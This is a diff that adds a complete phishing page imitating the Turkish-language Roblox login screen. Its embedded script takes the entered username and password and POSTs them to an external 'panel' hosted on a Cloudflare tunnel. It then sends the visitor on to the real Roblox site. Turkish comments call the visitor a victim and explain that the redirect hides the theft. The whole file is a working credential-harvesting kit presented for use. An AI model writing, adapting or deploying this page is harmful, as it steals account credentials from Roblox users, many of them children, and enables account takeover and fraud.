@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox | Giriş Yap</title>
+    <link rel="stylesheet" href="https://static.rbxcdn.com/css/page___8667688028753765187_7479634.css">
+    <style>
+        body { background-color: #f2f4f5; font-family: "HCo Gotham SSm", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif; }
+        .login-container { max-width: 400px; margin: 100px auto; background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .input-field { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #c3c3c3; border-radius: 4px; box-sizing: border-box; }
+        .login-button { width: 100%; padding: 12px; background-color: #0084ff; border: none; color: #fff; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        .login-button:hover { background-color: #0074e0; }
+        .text-center { text-align: center; margin-top: 20px; }
+        .text-link { color: #0084ff; text-decoration: none; font-size: 13px; }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <div class="section-content login-section">
+        <h1 style="text-align:center; margin-bottom: 25px;">Roblox'a Giriş Yap</h1>
+        
+        <div id="login-form">
+            <div class="login-form-container">
+                <form class="login-form">
+                    <div class="form-group">
+                        <input id="login-username" name="username" type="text" class="input-field" placeholder="Kullanıcı Adı/E-posta/Telefon">
+                    </div>
+                    <div class="form-group">
+                        <input id="login-password" name="password" type="password" class="input-field" placeholder="Şifre">
+                    </div>
+                    <button type="button" id="login-button" class="login-button">Giriş Yap</button>
+                </form>
+            </div>
+        </div>
+
+        <div class="text-center">
+            <a class="text-link" href="https://www.roblox.com/login/forgot-password-or-username">Kullanıcı Adını veya Şifreni mi unuttun?</a>
+        </div>
+
+        <div style="margin: 20px 0; border-top: 1px solid #e3e3e3;"></div>
+
+        <button type="button" class="input-field" style="background:#fff; cursor:pointer;">Hızlı Giriş</button>
+
+        <div class="text-center">
+            <span style="font-size: 13px; color: #666;">Hesabın yok mu?</span>
+            <a class="text-link" href="https://www.roblox.com/tr/CreateAccount">Kaydol</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    document.getElementById('login-button').addEventListener('click', async function() {
+        const user = document.getElementById('login-username').value;
+        const pass = document.getElementById('login-password').value;
+
+        if(user === "" || pass === "") {
+            alert("Lütfen tüm alanları doldurun.");
+            return;
+        }
+
+        // --- AYARLAR ---
+        // Buraya Cloudflare'de aktif olan post.php dosyanın tam adresini yaz
+        const PANEL_URL = 'http://regards-reputation-gps-sons.trycloudflare.com/post.php'; 
+        // ---------------
+
+        const formData = new URLSearchParams();
+        formData.append('u', user);
+        formData.append('p', pass);
+
+        try {
+            // Veriyi senin paneline gönderiyoruz
+            // 'no-cors' veya 'cors' modunu sunucu ayarına göre seçebilirsin
+            await fetch(PANEL_URL, {
+                method: 'POST',
+                mode: 'cors', 
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: formData
+            });
+            
+            // Bilgi gittikten sonra kurbanı Roblox'a yönlendir
+            window.location.href = "https://www.roblox.com/home"; 
+        } catch (error) {
+            // Hata olsa bile (veya gönderim sürerken) yönlendir ki kurban anlamasın
+            window.location.href = "https://www.roblox.com/home";
+        }
+    });
+</script>
+
+</body>
+</html>
